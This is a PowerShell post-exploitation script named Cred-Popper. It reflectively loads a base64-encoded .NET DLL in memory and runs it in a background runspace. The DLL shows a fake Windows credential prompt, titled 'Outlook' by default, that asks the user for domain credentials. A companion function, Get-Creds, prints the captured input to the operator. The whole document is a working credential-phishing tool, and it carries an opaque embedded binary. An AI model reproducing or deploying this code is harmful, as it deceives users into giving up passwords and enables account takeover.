function Cred-Popper($title="Outlook", $caption="Please Enter Your Domain Credentials") {

$scriptblock = @"
`$PS = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAN/6p1oAAAAAAAAAAOAAIiALATAAABAAAAAGAAAAAAAAQi8AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAPAuAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAC4LQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAASA8AAAAgAAAAEAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAASAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAFgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAkLwAAAAAAAEgAAAACAAUAECEAAKgMAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBwBQAAAAAQAAEQIKEgH+FQMAAAISAQZ9BwAABBIBA30GAAAEIMAABgAMFg1yAQAAcBMEcgEAAHATBRIBBhYSBBIFEgMIKAQAAAYmEQRyAwAAcBEFKA8AAAoqEzAKAE8AAAACAAARH2RzEAAACgofZHMQAAAKCwICcQMAAAKMAwAAAigRAAAKfQQAAAQCA34SAAAKBAYfZAcfZA4FDgYoAgAABgUGbxMAAApRDgQHbxMAAApRKh4CKBQAAAoqAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAJgEAAAjfgAABAUAANwFAAAjU3RyaW5ncwAAAADgCgAADAAAACNVUwDsCgAAEAAAACNHVUlEAAAA/AoAAKwBAAAjQmxvYgAAAAAAAAACAAABVz0CFAkCAAAA+gEzABYAAAEAAAAWAAAABQAAACQAAAAFAAAAFQAAABQAAAAdAAAADgAAAAEAAAACAAAAAgAAAAIAAAABAAAAAQAAAAMAAAAAAFkEAQAAAAAABgCQAyQFBgD9AyQFBgDOAvIEDwBWBQAABgD2AoMEBgBkA4MEBgBFA4MEBgDkA4MEBgCwA4MEBgDJA4MEBgANA4MEBgDiAgUFBgDAAgUFBgAoA4MEBgCHBXcEBgCiBK8FBgC2AncEBgCBA3cEBgB+BHcEBgA3BHcEBgBFBAUFBgDnBHcEAAAAAAsAAAAAAAEAAQABABAAnQUAAD0AAQABAAsBEgBLAQAARQAEAAYAAwEAANoBAABNAAkABgADAQAARAUAAE0AGwAGAFGAmADRAFGAWQDRAFGAEAHRAAYAJwTRAAYAkgU4AAYAuwXUAAYAygXUAAYAsAQ4AAYGagLRAFaARgDXAFaAKwLXAFaAkgHXAFaAsQHXAFaAwQDXAFaAVgLXAFaA1QDXAFaANADXAFaA7QDXAFaAZgDXAFaAeADXAFaAMgLXAFaA/gDXAFaANwHXAFaA5wHXAFaA+wHXAFaAigDXAAYGagLRAFaAiQHbAFaAFADbAFaAGwHbAFaAJADbAFaApgDbAFaAVwHbAFaAcQHbAFaAxgHbAFaAFwLbAAAAAACAAJYgaQTfAAEAAAAAAIAAkSA6AuUAAwBQIAAAAACWAMYE+gANAKwgAAAAAJEAawUAAQ8AByEAAAAAhhjhBAYAFgAAAAEA7gQAAAIAjgUAAAEAqAEAAAIAqwIAAAMAAQAAAAQA0QQAAAUAogIAAAYAlgIAAAcAhwIAAAgAewIAIAkAGwQAAAoAZQUAAAEAkAIAAAIAlQQAAAEA5AAAAAIAqwIAAAMA2AQAAAQAogIAAAUAhwIAAAYAIgQAAAcAZQUJAOEEAQARAOEEBgAZAOEECgApAOEEEAAxAOEEEAA5AOEEEABBAOEEEABJAOEEEABRAOEEEABZAOEEEABhAOEEFQBpAOEEEABxAOEEEACRAOEEBgChAIAFJQCBAOEEAQCpAC4EMwCxAJ0EOAB5ADUEOwB5AOEEBgAIAAQASAAIAAgASAAIAAwASAAIACgATQAIACwAUgAIADAAVwAIADQAXAAIADgAYQAIADwAZgAIAEAAawAIAEQAcAAIAEgAdQAIAEwAegAIAFAAfwAIAFQAhAAIAFgAiQAIAFwAjgAIAGAAkwAIAGQAmAAIAGgAnQAIAHAAogAIAHQApwAIAHgArAAIAHwAsQAIAIAAtgAIAIQAuwAIAIgAwAAIAIwAxQAIAJAAygAuAAsAEgEuABMAGwEuABsAOgEuACMAQwEuACsAVAEuADMAVAEuADsAVAEuAEMAQwEuAEsAWgEuAFMAVAEuAFsAVAEuAGMAcgEuAGsAnAGDAHMATQAXAM8AGgAsAE0EPgRGAQMAaQQBAAQBBQA6AgIABIAAAAEAAAAAAAAAAAAAAAAAugQAAAIAAAAAAAAAAAAAAD8AcgIAAAAAAwACAAQAAgAFAAIAAAAAAAByZXNlcnZlZDEAPE1vZHVsZT4ARVJST1JfQ0FOQ0VMTEVEAEVSUk9SX05PVF9GT1VORABSRVFVSVJFX1NNQVJUQ0FSRABJTkNPUlJFQ1RfUEFTU1dPUkQATUFYX1BBU1NXT1JEAFZBTElEQVRFX1VTRVJOQU1FAENPTVBMRVRFX1VTRVJOQU1FAEtFRVBfVVNFUk5BTUUATUFYX1VTRVJfTkFNRQBFUlJPUl9JTlZBTElEX0FDQ09VTlRfTkFNRQBSRVFVSVJFX0NFUlRJRklDQVRFAEFMV0FZU19TSE9XX1VJAGNyZWRpdFVJAFBBU1NXT1JEX09OTFlfT0sAU0VSVkVSX0NSRURFTlRJQUwATUFYX0RPTUFJTgBFUlJPUl9OT19TVUNIX0xPR09OX1NFU1NJT04ARVhQRUNUX0NPTkZJUk1BVElPTgBDUkVEVUlfSU5GTwBFUlJPUl9JTlNVRkZJQ0lFTlRfQlVGRkVSAEVSUk9SX0lOVkFMSURfUEFSQU1FVEVSAE5PX0VSUk9SAFJFUVVFU1RfQURNSU5JU1RSQVRPUgBjcmVkaXRVUgBFWENMVURFX0NFUlRJRklDQVRFUwBFUlJPUl9JTlZBTElEX0ZMQUdTAENSRURVSV9GTEFHUwBHRU5FUklDX0NSRURFTlRJQUxTAFVTRVJOQU1FX1RBUkdFVF9DUkVERU5USUFMUwBFUlJPUl9CQURfQVJHVU1FTlRTAERPX05PVF9QRVJTSVNUAENyZWRVSVByb21wdEZvckNyZWRlbnRpYWxzVwBTSE9XX1NBVkVfQ0hFQ0tfQk9YAHZhbHVlX18AbXNjb3JsaWIAbWF4UGFzc3dvcmQAcGFzc3dvcmQAdGl0bGUAbWF4VXNlck5hbWUAdXNlck5hbWUAdGFyZ2V0TmFtZQBWYWx1ZVR5cGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwZlNhdmUAc2F2ZQBjYlNpemUAU2l6ZU9mAFRvU3RyaW5nAGNyZWR1aQBNYXJzaGFsAGRsbG1haW4uZGxsAENyZWQtUG9wcGVyLmRsbABTZWN1cmVaZXJvTWVtAFN5c3RlbQBFbnVtAFN5c3RlbS5SZWZsZWN0aW9uAGNhcHRpb24AWmVybwBTdHJpbmdCdWlsZGVyAGhibUJhbm5lcgBDcmVkLVBvcHBlcgBDcmVkUG9wcGVyAGlFcnJvcgBuZXRFcnJvcgAuY3RvcgBJbnRQdHIAcHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDcmVkVUlSZXR1cm5Db2RlcwBEZWJ1Z2dpbmdNb2RlcwBmbGFncwBQcm9tcHRGb3JDcmVkZW50aWFscwBDb25jYXQAT2JqZWN0AGNudABod25kUGFyZW50AENyZWRlbnRpYWxzUHJvbXB0AFN5c3RlbS5UZXh0AHBzek1lc3NhZ2VUZXh0AHBzekNhcHRpb25UZXh0AAAAAAABAAUNAAoAAAAAAD9z7a6bKa9PhxbeAVbhS+0ABCAB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NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAARD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
`$DllBytes  = [System.Convert]::FromBase64String(`$PS)
`$Assembly = [System.Reflection.Assembly]::Load(`$DllBytes)
`$sessionstate.log = [CredentialsPrompt]::CredPopper("$title", "$caption")
"@

$global:sessionstate = [HashTable]::Synchronized(@{})
$sessionstate.log = New-Object System.Collections.ArrayList

$HTTP_runspace = [RunspaceFactory]::CreateRunspace()
$HTTP_runspace.Open()
$HTTP_runspace.SessionStateProxy.SetVariable('sessionstate',$sessionstate)
$HTTP_powershell = [PowerShell]::Create()
$HTTP_powershell.Runspace = $HTTP_runspace
$HTTP_powershell.AddScript($scriptblock) > $null
$HTTP_powershell.BeginInvoke() > $null

echo ""
echo "[+] Cred-Popper started in background runspace"
echo ""
echo "Run Get-Creds to obtain the output, when the user enters their credentials"
echo ""

}

function Get-Creds {
    echo ""
    "[+] Cred-Popper data:"
    echo $sessionstate.log
}
